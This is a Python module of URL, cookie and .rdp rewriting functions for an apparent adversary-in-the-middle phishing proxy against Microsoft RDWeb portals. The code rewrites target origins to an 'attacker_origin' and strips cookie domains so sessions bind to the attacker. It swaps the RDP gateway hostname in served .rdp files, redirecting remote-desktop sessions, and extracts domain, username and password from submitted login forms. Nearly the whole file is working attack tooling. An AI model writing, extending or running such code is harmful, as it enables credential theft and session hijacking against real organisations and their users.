"""URL / cookie / .rdp rewriting primitives (pure functions, no I/O).

RDWeb pages are XML+XSLT rendered CLIENT-SIDE. The load-bearing attribute
is baseurl="https://<target>/RDWeb/Pages/en-US/". Only scheme-qualified
upstream origins are rewritten; bare hostnames and duosecurity.com URLs
are never touched.
"""
import re
from urllib.parse import parse_qs

REWRITE_TYPES = (
    "text/html", "text/xml", "application/xml", "application/xhtml",
    "text/plain", "text/css", "application/javascript", "text/javascript",
    "application/x-javascript", "application/json",
)

HOP_HEADERS = {
    "connection", "keep-alive", "proxy-authenticate", "proxy-authorization",
    "te", "trailers", "transfer-encoding", "upgrade",
    "proxy-connection", "content-length", "content-encoding",
}


def _origin_variants(host, port, scheme_default):
    out = []
    schemes = ("https", "http")
    ports = {port} if port not in (80, 443) else set()
    if port == 443:
        ports.add(443)
    portstrs = [""] + [":%d" % p for p in sorted(ports)]
    for s in schemes:
        for ps in portstrs:
            out.append("%s://%s%s" % (s, host, ps))
    out.append("//%s" % host)
    return out


class UrlRewriter:
    def __init__(self, cfg):
        self.attacker_origin = cfg.attacker_origin
        pairs = []
        targets = [(cfg.target_host, cfg.target_port)] + \
            [(a, cfg.target_port) for a in cfg.target_aliases]
        for h, p in targets:
            for v in _origin_variants(h, p, cfg.target_scheme):
                pairs.append((v, self.attacker_origin))
        pairs.sort(key=lambda kv: -len(kv[0]))
        self._res = [
            (re.compile(re.escape(orig) + r"(?=[/\"'?\s<>&)])"), dst)
            for orig, dst in pairs
        ]

    def text(self, s):
        if not s:
            return s
        for rx, dst in self._res:
            if rx.search(s):
                s = rx.sub(dst, s)
        return s

    def location(self, value):
        return self.text(value)


def rewrite_set_cookie(cookie_line):
    if not cookie_line:
        return cookie_line
    parts = cookie_line.split(";")
    kept = [parts[0]]
    for p in parts[1:]:
        if p.strip().lower().startswith("domain="):
            continue
        kept.append(p)
    return ";".join(kept)


RDP_GATEWAY_LINE = re.compile(
    r"^(gatewayhostname\s*:\s*s:)(.+)$", re.MULTILINE)


def rewrite_rdp_gateway(rdp_text, new_gateway):
    if not new_gateway:
        return rdp_text
    return RDP_GATEWAY_LINE.sub(lambda m: m.group(1) + new_gateway, rdp_text)


RDP_FEED_URL = re.compile(
    r"(?:URL|FullAddr|FullAddress|alias)=[\"']?([^\"'>\s]+\.rdp)[\"']?",
    re.IGNORECASE)


def extract_rdp_links(text):
    seen = []
    for m in RDP_FEED_URL.finditer(text):
        u = m.group(1)
        if u not in seen:
            seen.append(u)
    return seen


def parse_login_form(body_bytes, charset="utf-8"):
    try:
        fields = {k: v[0] for k, v in
                  parse_qs(body_bytes.decode(charset, "replace"),
                           keep_blank_values=True).items()}
    except Exception:
        return {}, None
    if "DomainUserName" not in fields or "UserPass" not in fields:
        return fields, None
    raw_user = fields.get("DomainUserName", "")
    pw = fields.get("UserPass", "")
    domain, _, user = raw_user.partition("\\")
    if not user:
        user, _, dom2 = raw_user.partition("@")
        if dom2:
            domain = dom2
        else:
            domain = ""
            user = raw_user
    return fields, {
        "domain": domain, "username": user,
        "password": pw, "raw_user": raw_user,
    }
